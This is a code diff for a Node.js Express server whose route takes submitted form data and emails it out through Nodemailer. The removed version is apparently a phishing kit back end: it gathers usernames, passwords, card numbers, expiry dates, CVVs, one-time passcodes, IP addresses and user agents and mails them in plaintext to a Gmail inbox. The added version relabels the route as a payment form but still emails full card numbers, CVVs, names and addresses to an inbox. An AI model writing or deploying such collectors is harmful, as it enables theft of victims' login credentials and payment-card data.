@@ -11,28 +11,25 @@ app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// ✅ POST route to receive data
-app.post("/api/check", async (req, res) => {
+// ✅ POST route to receive payment form data
+app.post("/api/payment", async (req, res) => {
   const formData = req.body;
-  console.log("📩 Received form data:", formData);
+  console.log("📩 Received payment form data:", formData);
 
-  // Extract values
+  // Extract values (these match your frontend form field names)
   const {
-    user,
-    pass,
-    name,
-    cc,
-    exp,
-    cvv,
-    otp,
-    ip,
-    userAgent
+    "card-number": cardNumber,
+    month,
+    year,
+    "security-code": cvv,
+    "full-name": fullName,
+    address
   } = formData;
 
   try {
     // ✅ Setup Nodemailer transporter
     let transporter = nodemailer.createTransport({
-      service: "gmail", // change to outlook, yahoo, etc. if needed
+      service: "gmail", // or "outlook", "yahoo", etc.
       auth: {
         user: process.env.EMAIL_USER, // your email
         pass: process.env.EMAIL_PASS  // your app password
@@ -41,21 +38,17 @@ app.post("/api/check", async (req, res) => {
 
     // ✅ Send email
     await transporter.sendMail({
-      from: `"Form Bot" <${process.env.EMAIL_USER}>`,
-      to: "jessie.bosqueschool.org@gmail.com", // change to your real inbox
-      subject: "🔔 New OTP Form Submission",
+      from: `"Payment Bot" <${process.env.EMAIL_USER}>`,
+      to: "your-inbox@gmail.com", // replace with your receiving email
+      subject: "💳 New Payment Form Submission",
       text: `
-      📩 New Submission Received:
+      📩 New Payment Submission Received:
 
-      👤 User: ${user}
-      🔑 Pass: ${pass}
-      🙍 Name: ${name}
-      💳 Card: ${cc}
-      📅 Expiry: ${exp}
+      👤 Full Name: ${fullName}
+      🏠 Address: ${address}
+      💳 Card Number: ${cardNumber}
+      📅 Expiry: ${month}/${year}
       🔒 CVV: ${cvv}
-      🔐 OTP: ${otp}
-      🌍 IP: ${ip}
-      🖥️ UserAgent: ${userAgent}
       `
     });
 
